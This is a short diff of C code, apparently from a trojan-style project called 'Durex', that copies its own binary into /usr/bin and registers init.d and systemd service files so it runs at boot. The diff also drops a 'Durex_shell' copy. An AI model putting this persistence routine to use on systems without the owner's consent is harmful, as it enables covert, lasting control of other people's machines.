@@ -8,21 +8,26 @@ static void	install_daemon_binary(void)
 
 	if (binary == NULL)
 		return ;
-	// if (file_exists("/usr") == false)
-	// 	mkdir("/usr", 0700);
-	// if (file_exists("/usr/bin") == false)
-	// 	mkdir("/usr/bin", 0700);
+	if (file_exists("/usr") == false)
+		mkdir("/usr", 0700);
+	if (file_exists("/usr/bin") == false)
+		mkdir("/usr/bin", 0700);
 	file_put_contents_size("/usr/bin/Durex", binary, size);
-	file_put_contents_size("/usr/bin/Durex_shell", binary, size);
 }
 
 static void	install_daemon_kernel_runtime(void)
 {
-	// if (file_exists("/etc") == false)
-	// 	mkdir("/etc", 0700);
-	// if (file_exists("/etc/init.d") == false)
-	// 	mkdir("/etc/init.d", 0700);
+	if (file_exists("/etc") == false)
+		mkdir("/etc", 0700);
+	if (file_exists("/etc/init.d") == false)
+		mkdir("/etc/init.d", 0700);
 	file_put_contents("/etc/init.d/Durex", (char*)daemon_init);
+	if (file_exists("/etc") == false)
+		mkdir("/etc", 0700);
+	if (file_exists("/etc/systemd") == false)
+		mkdir("/etc/systemd", 0700);
+	if (file_exists("/etc/systemd/system") == false)
+		mkdir("/etc/systemd/system", 0700);
 	file_put_contents("/etc/systemd/system/Durex.service", (char*)daemon_init_systemd);
 }
 
